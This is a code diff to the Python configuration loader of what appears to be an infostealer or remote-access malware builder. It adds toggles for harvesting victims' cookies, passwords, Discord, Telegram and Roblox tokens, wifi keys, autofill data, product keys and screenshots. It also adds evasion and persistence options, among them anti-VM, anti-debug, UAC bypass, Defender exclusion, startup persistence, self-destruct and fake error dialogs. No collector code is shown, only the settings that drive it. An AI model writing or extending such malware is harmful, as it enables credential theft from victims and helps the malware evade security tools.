@@ -82,6 +82,42 @@ def load(path: str | None = None) -> dict:
         "block_taskmgr": bool(raw.get("block_taskmgr", True)),
         "av_blocklist": bool(raw.get("av_blocklist", True)),
         "max_upload_bytes": int(raw.get("max_upload_bytes", 50 * 1024 * 1024)),
+
+        # ---- stealer toggles (granular; each maps to a collector) ----------
+        # Defaults mirror what a fresh panel build ships: broad harvest on,
+        # the noisier/lower-yield ones off so an empty result isn't mistaken
+        # for a bug.
+        "steal": {
+            "system_info":   bool(raw.get("steal", {}).get("system_info", True)),
+            "cookies":       bool(raw.get("steal", {}).get("cookies", True)),
+            "passwords":     bool(raw.get("steal", {}).get("passwords", True)),
+            "discord":       bool(raw.get("steal", {}).get("discord", True)),
+            "telegram":      bool(raw.get("steal", {}).get("telegram", True)),
+            "roblox":        bool(raw.get("steal", {}).get("roblox", True)),
+            "history":       bool(raw.get("steal", {}).get("history", False)),
+            "wifi":          bool(raw.get("steal", {}).get("wifi", True)),
+            "autofill":      bool(raw.get("steal", {}).get("autofill", True)),
+            "extensions":    bool(raw.get("steal", {}).get("extensions", True)),
+            "product_keys":  bool(raw.get("steal", {}).get("product_keys", True)),
+            "software_list": bool(raw.get("steal", {}).get("software_list", True)),
+            "screenshot":    bool(raw.get("steal", {}).get("screenshot", True)),
+        },
+
+        # ---- malware / evasion toggles -------------------------------------
+        "opts": {
+            "anti_vm":           bool(raw.get("opts", {}).get("anti_vm", False)),
+            "anti_debug":        bool(raw.get("opts", {}).get("anti_debug", False)),
+            "anti_analysis":     bool(raw.get("opts", {}).get("anti_analysis", False)),
+            "uac_bypass":        bool(raw.get("opts", {}).get("uac_bypass", False)),
+            "startup":           bool(raw.get("opts", {}).get("startup", True)),
+            "kill_browsers":     bool(raw.get("opts", {}).get("kill_browsers", False)),
+            "self_destruct":     bool(raw.get("opts", {}).get("self_destruct", False)),
+            "defender_exclusion":bool(raw.get("opts", {}).get("defender_exclusion", False)),
+            "fake_error":        bool(raw.get("opts", {}).get("fake_error", False)),
+            "error_text":        str(raw.get("opts", {}).get("error_text", ""))[:500],
+            "startup_delay":     max(0, int(raw.get("opts", {}).get("startup_delay", 0))),
+        },
+
         "_source": chosen,
     }
     return cfg
